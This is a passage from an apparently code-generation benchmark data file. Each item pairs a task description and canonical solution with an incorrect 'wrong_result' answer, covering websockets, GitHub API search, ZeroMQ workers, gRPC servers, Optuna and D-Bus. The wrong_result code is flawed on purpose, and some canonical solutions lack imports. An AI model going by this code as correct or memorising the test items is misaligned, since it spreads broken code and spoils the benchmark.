> 1:\n            print('exception', loop, context)\n        pass\n\n    try:\n        start_server = websockets.serve(server, \"127.0.0.1\", PORT_NUM)\n        asyncio.get_event_loop().run_until_complete(start_server)\n        asyncio.get_event_loop().set_exception_handler(srv_exception)\n        asyncio.get_event_loop().run_forever()\n    except Exception as e:\n        print('[srv error]', e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport multiprocessing\nfrom typing import Tuple, Union\n\nclass SocketWorker:\n    def __init__(self, queueX: multiprocessing.Queue, queueZ: multiprocessing.Queue):\n        self.queueX = queueX\n        self.queueZ = queueZ\n        self.clients = {}\n\n    async def producer(self) -> Union[Tuple[str, str], str]:\n        while True:\n            if not self.queueX.empty():\n                return self.queueX.get()\n            await asyncio.sleep(1)\n            yield ('ping', '')\n\n    async def producer_handler(self, websocket: websockets.WebSocketServerProtocol, path: str) -> None:\n        async for client_id, message in self.producer():\n            if client_id == 'ping':\n                await websocket.send(message)\n            elif client_id in self.clients:\n                await self.clients[client_id].send(message)\n\n    async def consumer(self, websocket: websockets.WebSocketServerProtocol, msg: str) -> None:\n        if msg == 'pong':\n            return\n        self.queueZ.put((self.clients[websocket], msg))\n\n    async def consumer_handler(self, websocket: websockets.WebSocketServerProtocol, path: str) -> None:\n        async for msg in websocket:\n            await self.consumer(websocket, msg)\n\n    async def server(self, websocket: websockets.WebSocketServerProtocol, path: str) -> None:\n        client_id = id(websocket)\n        self.clients[client_id] = websocket\n        try:\n            await asyncio.gather(\n                self.producer_handler(websocket, path),\n                self.consumer_handler(websocket, path)\n            )\n        finally:\n            del self.clients[client_id]\n\n    def srv_exception(self, loop: asyncio.AbstractEventLoop, context: dict) -> None:\n        loop.default_exception_handler(context)\n\ndef run_socket_worker(queueX: multiprocessing.Queue, queueZ: multiprocessing.Queue):\n    worker = SocketWorker(queueX, queueZ)\n    start_server = websockets.serve(worker.server, \"localhost\", 8765)\n    loop = asyncio.get_event_loop()\n    loop.set_exception_handler(worker.srv_exception)\n    loop.run_until_complete(start_server)\n    loop.run_forever()\n\nif __name__ == \"__main__\":\n    queueX = multiprocessing.Queue()\n    queueZ = multiprocessing.Queue()\n    p = multiprocessing.Process(target=run_socket_worker, args=(queueX, queueZ))\n    p.start()\n    p.join()\n```"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nimport aiohttp\nfrom typing import Optional\n\nasync def search_github_issues(query: str, repo: str = \"prefecthq/prefect\", n: int = 3, api_token: Optional[str] = None) -> str:\n    if not api_token:\n        # Attempt to retrieve API token from environment variables, configuration files, etc.\n        pass\n\n    url = f\"https://api.github.com/search/issues?q={query}+repo:{repo}\"\n    headers = {}\n    if api_token:\n        headers[\"Authorization\"] = f\"token {api_token}\"\n\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url, headers=headers) as response:\n            if response.status == 200:\n                data = await response.json()\n                issues = data.get(\"items\", [])[:n]\n                if not issues:\n                    return \"No issues found.\"\n                \n                summary = \"\"\n                for issue in issues:\n                    title = issue.get(\"title\")\n                    url = issue.get(\"html_url\")\n                    body = issue.get(\"body\", \"\")\n                    summary += f\"Title: {title}\\nURL: {url}\\nBody: {body[:100]}...\\n\\n\"\n                return summary\n            else:\n                return f\"Failed to fetch issues. Status code: {response.status}\"\n```"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a multi-process data processing system using ZeroMQ for inter-process communication, where worker processes apply a mapping function to incoming data points and return the results.\n\nClass Description: MultiProcessMapDataZMQ is a class that manages multiple worker processes for parallel data processing using ZeroMQ's REQ/REP pattern. It handles process creation, communication, and data serialization.\n\nAttributes:\n- ds: [Any] - The data source to be processed\n- num_proc: [int] - Number of worker processes to create\n- map_func: [callable] - Function to apply to each data point\n- _buffer_size: [int] - High water mark for ZeroMQ sockets\n- _strict: [bool] - Whether to enforce strict processing rules\n- _procs: [list] - List of worker processes\n- context: [zmq.Context] - ZeroMQ context\n- socket: [zmq.Socket] - Main DEALER socket for communication\n- _proc_ids: [list] - List of process identifiers\n\nMethods:\n- __init__(ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False) -> None - Initializes the multi-process mapper with configuration parameters\n- reset_state() -> None - Sets up ZeroMQ context, sockets, and starts worker processes\n- _create_worker(id, pipename, hwm) -> _Worker - Creates a worker process instance\n- _send(dp) -> None - Sends a data point to workers\n- _recv() -> Any - Receives processed data from workers\n\nNested _Worker Class:\n- __init__(identity, map_func, pipename, hwm) -> None - Initializes a worker process\n- run() -> None - Worker's main loop that processes incoming data using REQ/REP pattern",
    "Canonical_solution": "import zmq\nimport multiprocessing as mp\nfrom ..utils.serialize import dumps_once as dumps, loads_once as loads\nfrom ..utils.concurrency import enable_death_signal\n\nclass MultiProcessMapDataZMQ:\n    class _Worker(mp.Process):\n        def __init__(self, identity, map_func, pipename, hwm):\n            super(MultiProcessMapDataZMQ._Worker, self).__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n\n        def run(self):\n            enable_death_signal(_warn=self.identity == b'0')\n            ctx = zmq.Context()\n            socket = ctx.socket(zmq.REP)\n            socket.setsockopt(zmq.IDENTITY, self.identity)\n            socket.set_hwm(self.hwm)\n            socket.connect(self.pipename)\n\n            while True:\n                dp = loads(socket.recv(copy=False))\n                dp = self.map_func(dp)\n                socket.send(dumps(dp), copy=False)\n\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size * 2)\n        pipename = _get_pipe_name('dataflow-map')\n        _bind_guard(self.socket, pipename)\n\n        self._proc_ids = [u'{}'.format(k).encode('utf-8') for k in range(self.num_proc)]\n        worker_hwm = int(self._buffer_size * 2 // self.num_proc)\n        self._procs = [self._create_worker(self._proc_ids[k], pipename, worker_hwm)\n                       for k in range(self.num_proc)]\n\n        self._start_processes()\n\n    def _create_worker(self, id, pipename, hwm):\n        return MultiProcessMapDataZMQ._Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        msg = [b\"\", dumps(dp)]\n        self.socket.send_multipart(msg, copy=False)\n\n    def _recv(self):\n        msg = self.socket.recv_multipart(copy=False)\n        dp = loads(msg[1])\n        return dp",
    "Code_level": "Class-level",
    "FSMID_for_test": 87,
    "wrong_result": "```python\nimport zmq\nimport multiprocessing\nimport os\n\nclass MultiProcessMapDataZMQ:\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc if num_proc is not None else multiprocessing.cpu_count()\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n        self.context = None\n        self.socket = None\n        self._proc_ids = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size)\n        for i in range(self.num_proc):\n            pipe_parent, pipe_child = multiprocessing.Pipe(duplex=False)\n            proc = self._create_worker(i, pipe_child, self._buffer_size)\n            proc.start()\n            self._procs.append(proc)\n            self._proc_ids.append(pipe_parent.fileno())\n\n    def _create_worker(self, id, pipename, hwm):\n        return _Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        self.socket.send_pyobj(dp)\n\n    def _recv(self):\n        return self.socket.recv_pyobj()\n\nclass _Worker(multiprocessing.Process):\n    def __init__(self, identity, map_func, pipename, hwm):\n        super().__init__()\n        self.identity = identity\n        self.map_func = map_func\n        self.pipename = pipename\n        self.hwm = hwm\n\n    def run(self):\n        context = zmq.Context()\n        socket = context.socket(zmq.REP)\n        socket.setsockopt(zmq.IDENTITY, bytes(f'worker-{self.identity}', 'utf-8'))\n        socket.set_hwm(self.hwm)\n        socket.connect(f'inproc://worker-{self.identity}')\n        while True:\n            dp = socket.recv_pyobj()\n            result = self.map_func(dp)\n            socket.send_pyobj(result)\n```"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC and JinaSingleDataRequestRPC services.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for multiple services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- health_servicer: grpc_health.v1.health.HealthServicer - Handles health check requests for the services\n- grpc_server: grpc.aio.server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int) -> None - Initializes the MultiProtocolGateway with the specified gRPC port\n- _setup_grpc_server() -> None - Sets up the gRPC server with all required services (JinaRPC, JinaSingleDataRequestRPC), health checks, and reflection\n- run_server() -> None - Starts the gRPC server and keeps it running until termination\n- shutdown() -> None - Gracefully shuts down the gRPC server and health servicer",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\nfrom jina.constants import __default_host__\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int):\n        self.grpc_port = grpc_port\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            jina_pb2.DESCRIPTOR.services_by_name['JinaSingleDataRequestRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{__default_host__}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\nimport grpc_health.v1.health_pb2_grpc as health_pb2_grpc\nimport grpc_health.v1.health as health_pb2\nimport grpc_reflection.v1alpha.reflection as reflection\nfrom jina_pb2_grpc import JinaRPCServicer, JinaRPCStub, JinaSingleDataRequestRPCServicer, JinaSingleDataRequestRPCStub\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int) -> None:\n        self.grpc_port = grpc_port\n        self.health_servicer = health_pb2_grpc.HealthServicer()\n        self.grpc_server = None\n\n    def _setup_grpc_server(self) -> None:\n        self.grpc_server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=10))\n        JinaRPCServicer.add_to_server(JinaRPCServicer(), self.grpc_server)\n        JinaSingleDataRequestRPCServicer.add_to_server(JinaSingleDataRequestRPCServicer(), self.grpc_server)\n        health_pb2_grpc.add_HealthServicer_to_server(self.health_servicer, self.grpc_server)\n        service_names = (\n            JinaRPCServicer().GetServiceDescriptor().full_name,\n            JinaSingleDataRequestRPCServicer().GetServiceDescriptor().full_name,\n            reflection.SERVICE_NAME,\n        )\n        reflection.enable_server_reflection(service_names, self.grpc_server)\n\n    async def run_server(self) -> None:\n        await self._setup_grpc_server()\n        await self.grpc_server.start()\n        try:\n            await self.grpc_server.wait_for_termination()\n        except KeyboardInterrupt:\n            await self.shutdown()\n\n    async def shutdown(self) -> None:\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()\n```"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Implement a gRPC server for Optuna storage proxy service that handles study and trial management operations.\n\nClass Description: OptunaStorageProxyService is a gRPC servicer class that implements the StorageService interface, providing methods to manage Optuna studies and trials through a gRPC server. It acts as a proxy between gRPC clients and the underlying Optuna storage backend.\n\nAttributes:\n- _backend: BaseStorage - The underlying Optuna storage implementation\n- _lock: threading.Lock - A lock for thread-safe operations\n\nMethods:\n- CreateNewStudy(request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply - Creates a new study with given directions and name\n- DeleteStudy(request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply - Deletes a study with the given ID\n- SetStudyUserAttribute(request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply - Sets a user attribute for a study\n- GetStudyIdFromName(request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply - Gets study ID from study name\n- GetStudyNameFromId(request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply - Gets study name from study ID\n- GetAllStudies(request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply - Gets all studies in the storage\n- CreateNewTrial(request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply - Creates a new trial in a study\n- SetTrialParameter(request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply - Sets parameters for a trial\n- GetTrial(request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply - Gets trial details\n- GetAllTrials(request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply - Gets all trials for a study with optional state filtering",
    "Canonical_solution": "from concurrent.futures import ThreadPoolExecutor\nimport grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2_grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2\nfrom optuna.storages._grpc.grpc_imports import StorageServiceServicer\nfrom optuna.storages import BaseStorage\nfrom optuna._experimental import experimental_func\nimport logging\n\n_logger = logging.get_logger(__name__)\n\nclass OptunaStorageProxyService(StorageServiceServicer):\n    def __init__(self, storage: BaseStorage) -> None:\n        self._backend = storage\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        directions = [\n            StudyDirection.MINIMIZE if d == api_pb2.MINIMIZE else StudyDirection.MAXIMIZE\n            for d in request.directions\n        ]\n        study_name = request.study_name\n\n        try:\n            study_id = self._backend.create_new_study(directions=directions, study_name=study_name)\n        except DuplicatedStudyError as e:\n            context.abort(code=grpc.StatusCode.ALREADY_EXISTS, details=str(e))\n        return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        study_id = request.study_id\n        try:\n            self._backend.delete_study(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        try:\n            self._backend.set_study_user_attr(\n                request.study_id, request.key, json.loads(request.value)\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        try:\n            study_id = self._backend.get_study_id_from_name(request.study_name)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        study_id = request.study_id\n        try:\n            name = self._backend.get_study_name_from_id(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        assert name is not None\n        return api_pb2.GetStudyNameFromIdReply(study_name=name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        studies = self._backend.get_all_studies()\n        return api_pb2.GetAllStudiesReply(\n            studies=[\n                api_pb2.Study(\n                    study_id=study._study_id,\n                    study_name=study.study_name,\n                    directions=[\n                        api_pb2.MINIMIZE if d == StudyDirection.MINIMIZE else api_pb2.MAXIMIZE\n                        for d in study.directions\n                    ],\n                    user_attributes={\n                        key: json.dumps(value) for key, value in study.user_attrs.items()\n                    },\n                    system_attributes={\n                        key: json.dumps(value) for key, value in study.system_attrs.items()\n                    },\n                )\n                for study in studies\n            ]\n        )\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        study_id = request.study_id\n        template_trial = None\n        if not request.template_trial_is_none:\n            template_trial = _from_proto_trial(request.template_trial)\n\n        try:\n            trial_id = self._backend.create_new_trial(study_id, template_trial)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        trial_id = request.trial_id\n        param_name = request.param_name\n        param_value_internal = request.param_value_internal\n        distribution = json_to_distribution(request.distribution)\n        try:\n            self._backend.set_trial_param(trial_id, param_name, param_value_internal, distribution)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        except RuntimeError as e:\n            context.abort(code=grpc.StatusCode.FAILED_PRECONDITION, details=str(e))\n        except ValueError as e:\n            context.abort(code=grpc.StatusCode.INVALID_ARGUMENT, details=str(e))\n        return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        trial_id = request.trial_id\n        try:\n            trial = self._backend.get_trial(trial_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetTrialReply(trial=_to_proto_trial(trial))\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        study_id = request.study_id\n        states = [_from_proto_trial_state(state) for state in request.states]\n        try:\n            trials = self._backend.get_all_trials(\n                study_id,\n                deepcopy=False,\n                states=states,\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetAllTrialsReply(trials=[_to_proto_trial(trial) for trial in trials])\n\n@experimental_func(\"4.2.0\")\ndef run_grpc_proxy_server(\n    storage: BaseStorage,\n    *,\n    host: str = \"localhost\",\n    port: int = 13000,\n    thread_pool: ThreadPoolExecutor | None = None,\n) -> None:\n    server = grpc.server(thread_pool or ThreadPoolExecutor(max_workers=10))\n    api_pb2_grpc.add_StorageServiceServicer_to_server(\n        OptunaStorageProxyService(storage), server\n    )\n    server.add_insecure_port(f\"{host}:{port}\")\n    server.start()\n    _logger.info(f\"Server started at {host}:{port}\")\n    _logger.info(\"Listening...\")\n    server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\nimport threading\nimport optuna\nfrom optuna.storages import BaseStorage\nfrom . import api_pb2\nfrom . import api_pb2_grpc\n\nclass OptunaStorageProxyService(api_pb2_grpc.StorageServiceServicer):\n    def __init__(self, backend: BaseStorage):\n        self._backend = backend\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        with self._lock:\n            study_id = self._backend.create_new_study(directions=request.directions, study_name=request.name)\n        return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        with self._lock:\n            self._backend.delete_study(study_id=request.study_id)\n        return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        with self._lock:\n            self._backend.set_study_user_attr(study_id=request.study_id, key=request.key, value=request.value)\n        return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        with self._lock:\n            study_id = self._backend.get_study_id_from_name(study_name=request.name)\n        return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        with self._lock:\n            study_name = self._backend.get_study_name(study_id=request.study_id)\n        return api_pb2.GetStudyNameFromIdReply(name=study_name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        with self._lock:\n            studies = self._backend.get_all_studies()\n        return api_pb2.GetAllStudiesReply(studies=[api_pb2.Study(study_id=study.study_id, name=study.name) for study in studies])\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        with self._lock:\n            trial_id = self._backend.create_new_trial(study_id=request.study_id)\n        return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        with self._lock:\n            self._backend.set_trial_param(trial_id=request.trial_id, param_name=request.param_name, param_value=request.param_value, distribution=request.distribution)\n        return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        with self._lock:\n            trial = self._backend.get_trial(trial_id=request.trial_id)\n        return api_pb2.GetTrialReply(\n            trial_id=trial.trial_id,\n            state=trial.state,\n            params=[api_pb2.Param(name=p.name, value=p.value) for p in trial.params],\n            distributions=[api_pb2.Distribution(name=d.name, type=d.type) for d in trial.distributions]\n        )\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        with self._lock:\n            trials = self._backend.get_all_trials(study_id=request.study_id, states=request.states)\n        return api_pb2.GetAllTrialsReply(trials=[self._convert_trial_to_proto(trial) for trial in trials])\n\n    def _convert_trial_to_proto(self, trial: optuna.Trial) -> api_pb2.Trial:\n        return api_pb2.Trial(\n            trial_id=trial.trial_id,\n            state=trial.state,\n            params=[api_pb2.Param(name=p.name, value=p.value) for p in trial.params],\n            distributions=[api_pb2.Distribution(name=d.name, type=d.type) for d in trial.distributions]\n        )\n```"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Python function that interacts with the Pithos music player via D-Bus to retrieve and format the currently playing song's artist and title.\n\nFunction Description: The function connects to the user's D-Bus session bus, accesses the Pithos music player service, retrieves the current song information, and returns it in a formatted string combining the artist and title.\n\nInput: None\n\nOutput: str - A string in the format \"Artist - Title\" representing the currently playing song in Pithos, or None if the operation fails.",
    "Canonical_solution": "import dbus\n\ndef get_pithos_current_song():\n    pithos_bus = dbus.SessionBus()\n    pithos = pithos_bus.get_object(\"net.kevinmehall.Pithos\", \"/net/kevinmehall/Pithos\")\n    props = pithos.get_dbus_method(\"GetCurrentSong\", \"net.kevinmehall.Pithos\")\n    return props()[\"artist\"] + \" - \" + props()[\"title\"]",
    "Code_level": "Function-level",
    "FSMID_for_test": 75,
    "wrong_result": "import dbus\n\ndef get_current_song():\n    try:\n        # Connect to the session bus\n        bus = dbus.SessionBus()\n        \n        # Get the Pithos player object\n        player_obj = bus.get_object('net.pithos.Pithos', '/net/pithos/Pithos')\n        \n        # Get the properties interface\n        properties_interface = dbus.Interface(player_obj, dbus.PROPERTIES_IFACE)\n        \n        # Retrieve the current song metadata\n        metadata = properties_interface.Get('org.mpris.MediaPlayer2.Player', 'Metadata')\n        \n        # Extract artist and title\n        artist = metadata.get('xesam:artist', ['Unknown Artist'])[0]\n        title = metadata.get('xesam:title', 'Unknown Title')\n        \n        # Return the formatted string\n        return f\"{artist} - {title}\"\n    \n    except dbus.DBusException as e:\n        print(f\"DBus error: {e}\")\n        return None\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n        return None"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create an asynchronous function to check if the ngrok API is online and wait for it to become available if it's not.\n\nFunction Description: The function continuously attempts to connect to the ngrok API at a specified URL (constructed from environment variables) until it receives a successful response. It uses exponential backoff (fixed interval retries) between attempts and logs the connection status. The function is designed to be used in scenarios where you need to ensure the ngrok API is available before proceeding with operations that depend on it.\n\nInput: \n- None (uses environment variables NGROK_HOST and NGROK_PORT to construct the API URL)\n  \nOutput: \n- Returns True when the ngrok API is successfully reached\n- Does not return until a successful connection is established (infinite retry loop)",
    "Canonical_solution": "import asyncio\nimport httpx\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def wait_for_ngrok_api():\n    NGROK_API_URL = f\"http://{os.getenv('NGROK_HOST', 'ngrok')}:{os.getenv('NGROK_PORT', 4040)}\"\n    RETRY_INTERVAL = 15\n\n    while True:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(f\"{NGROK_API_URL}/api/tunnels\")\n                response.raise_for_status()\n                logger.debug(\"ngrok API is online.\")\n                return True\n        except httpx.RequestError:\n            logger.debug(\"ngrok API is offline. Waiting...\")\n            await asyncio.sleep(RETRY_INTERVAL)",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import os\nimport time\nimport requests\nimport asyncio\n\nasync def wait_for_ngrok_api():\n    host = os.getenv('NGROK_HOST', 'localhost')\n    port = os.getenv('NGROK_PORT', '4040')\n    url = f'http://{host}:{port}/api/tunnels'\n    max_attempts = 10\n    attempt = 0\n    while True:\n        try:\n            response = requests.get(url)\n            if response.status_code == 200:\n                print(\"Ngrok API is online.\")\n                return True\n            else:\n                print(f\"Failed to connect to ngrok API. Status code: {response.status_code}\")\n        except requests.RequestException as e:\n            print(f\"Request failed: {e}\")\n        \n        attempt += 1\n        if attempt >= max_attempts:\n            print(\"Max attempts reached. Retrying indefinitely.\")\n            attempt = 0\n        \n        print(f\"Retrying in {attempt} seconds...\")\n        await asyncio.sleep(attempt)"
  },
  {
    "Task_id": 56,
